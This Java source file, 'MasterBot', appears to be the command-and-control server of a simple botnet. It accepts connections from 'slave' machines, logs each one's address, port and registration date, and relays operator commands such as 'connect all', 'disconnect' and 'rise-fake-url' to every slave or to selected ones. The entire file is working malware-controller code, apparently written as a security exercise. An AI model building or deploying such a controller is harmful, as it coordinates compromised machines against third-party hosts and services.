import java.io.IOException;
import java.io.PrintStream;
import java.net.*;
import java.text.*;
import java.util.*;
import java.util.Map.Entry;

public class MasterBot extends Thread{
	
	/*
	 * Constructor for MasterBot
	 */
	private ServerSocket master_bot = null;
	private static Map<Socket, String> map_socket_details = new HashMap<Socket, String>();
	
	public MasterBot(int portNum) throws Exception {
		// TODO Auto-generated constructor stub
		master_bot = new ServerSocket(portNum);
		//System.out.println("master_bot:"+master_bot.getLocalPort());
	}
	
	
	public static void main(String[] args) throws Exception
	{
		int master_port = 0;
		/*
		 * If the option if -p, then enter the if condition to get the port number
		 */
		if (args[0].equals("p"))
		{
			//Getting the port number of the MasterBot
			master_port = Integer.parseInt(args[1]);
		}
		else
		{
			//Invalid argument is passing
			System.exit(-1);
		}
		
		/*
		 * Creating the instance of the MasterBlock
		 */
		
		Thread m_bot= new MasterBot(master_port);
		
		/*
		 * Starting the thread
		 */
		m_bot.start();
		
		while(true)
		{
			/*
			 * Getting the option to be executed from the user
			 */
			String Input_option = null;
			Scanner in = new Scanner(System.in);
			System.out.print(">");
			try
			{
				Input_option = in.nextLine();
			}
			catch (NoSuchElementException e) {
				// TODO: handle exception
				// Do nothing
			}
			
			/*
			 * Splitting the values into array of string
			 */
			
			String[] user_options;
			
			try
			{
				user_options = Input_option.split("\\s+");
			}
			catch(NullPointerException np)
			{
				System.out.println("The program is exited from the user!!!!!");
				return;
			}
			
			/*
			 * Options available for the user
			 */
			String option_list = "list";
			String option_connect = "connect";
			String option_disconnect = "disconnect";
			String option_rise_url = "rise-fake-url";
			String option_down_url = "down-fake-url";
			
			
			if (user_options[0].equals(option_list))
			{
				/*
				 * If the option is list
				 */
				
				for(Entry<Socket, String> entry: map_socket_details.entrySet())
				{
					System.out.println(entry.getValue());
				}
				
			}
			else if (user_options[0].equals(option_connect))
			{
				/*
				 * for connect option
				 */
				PrintStream ps;
				if (user_options[1].equals("all"))
				{
					for(Entry<Socket, String> entry: map_socket_details.entrySet())
					{
						Socket slv_soc = entry.getKey();
						ps = new PrintStream(slv_soc.getOutputStream());
						ps.println(Input_option);
					} 
				}
				else
				{
					
					for(Entry<Socket, String> entry: map_socket_details.entrySet())
					{
						Socket slv_soc = entry.getKey();
						String s1 = entry.getValue();
						
						if(s1.contains(user_options[1]))
						{
							ps = new PrintStream(slv_soc.getOutputStream());
							ps.println(Input_option);
						}
						
					}
				}// end of else
			}
			else if(user_options[0].equals(option_disconnect))
			{
				PrintStream ps;
				if (user_options[1].equals("all"))
				{
					for(Entry<Socket, String> entry: map_socket_details.entrySet())
					{
						Socket slv_soc = entry.getKey();
						ps = new PrintStream(slv_soc.getOutputStream());
						ps.println(Input_option);
					} 
				}
				else
				{
					for(Entry<Socket, String> entry: map_socket_details.entrySet())
					{
						Socket slv_soc = entry.getKey();
						String s1 = entry.getValue();
						
						if(s1.contains(user_options[1]))
						{
							ps = new PrintStream(slv_soc.getOutputStream());
							ps.println(Input_option);
						}
						
					}
				}// end of else
			}
			else if (user_options[0].equals(option_rise_url)  || user_options[0].equals(option_down_url))
			{
				PrintStream ps;
				for(Entry<Socket, String> entry: map_socket_details.entrySet())
				{
					Socket slv_soc = entry.getKey();
					ps = new PrintStream(slv_soc.getOutputStream());
					ps.println(Input_option);
				}
			}
			else
			{
				/*
				 * Invalid Option
				 */
				System.exit(-1);
			}
			
		}//while(true)
		
		
		
	}//End of main function
	
	public void run()
	{
		try {
			while(true)
			{

				Socket slave_soc = master_bot.accept();
				
				/*
				 * getting the IP Address, Port Number and the Registration date of the slave socket
				 */
				
				String slave_port = ""+slave_soc.getPort();
				
				/*
				 * Getting the port number and the Hostname of the slave socket
				 */
				InetAddress slave_Inet_address = slave_soc.getInetAddress();
				String slave_Ip_address = slave_Inet_address.toString();
				//String slave_host_name = slave_Inet_address.getHostName();
				String slave_host_name = (java.net.InetAddress.getLocalHost()).toString();
				
				/*
				 * Getting the date in the required format
				 */
				DateFormat df = new SimpleDateFormat("yyyy-MM-dd");
				//Date date = new Date();
				String date_string = df.format(Calendar.getInstance().getTime());
				
				
				//Making hash of socket and socket details
				String array_entry = slave_host_name + " " + slave_Ip_address + " "+ slave_port +" "+ date_string;
				map_socket_details.put(slave_soc, array_entry);	
			}
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}// End of run()
}// End of the MasterBot class





